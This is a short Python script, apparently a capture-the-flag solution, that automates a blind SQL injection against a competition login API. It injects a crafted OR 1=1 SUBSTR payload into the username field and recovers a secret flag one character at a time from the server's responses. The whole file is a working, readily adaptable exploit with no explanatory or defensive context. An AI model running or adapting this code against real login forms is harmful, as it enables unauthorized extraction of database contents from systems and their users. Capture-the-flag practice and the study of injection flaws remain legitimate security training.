#!/bin/env python3
import time
import string
import requests

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'

URL = "http://challenges.ecsc-teamfrance.fr:8004/api/v1/login/"

blind_string = "' OR 1=1 AND SUBSTR(({}),1,{}) = '{}';--"
headers = { "Content-Type": "application/json" }
data = { "password": "test", "username": None }

query = "SELECT flag FROM flag"
val = "ECSC{"

while True:
    found = False

    # for c in string.printable:
    for c in string.digits + "abcdef}":
        print("\rTrying: %s%s%s%s%s" % (bcolors.OKGREEN, val, bcolors.WARNING, c, bcolors.ENDC), end='')

        data["username"] = blind_string.format(query, len(val) + 1, val + c)
        res = requests.post(URL, json=data, headers=headers).text

        if res.find("fail") == -1:
            found = True
            val += c
            break
        time.sleep(0.1)

    if not found:
        break

print('\rYour flag: %s%s%s' % (bcolors.OKBLUE, val, bcolors.ENDC))
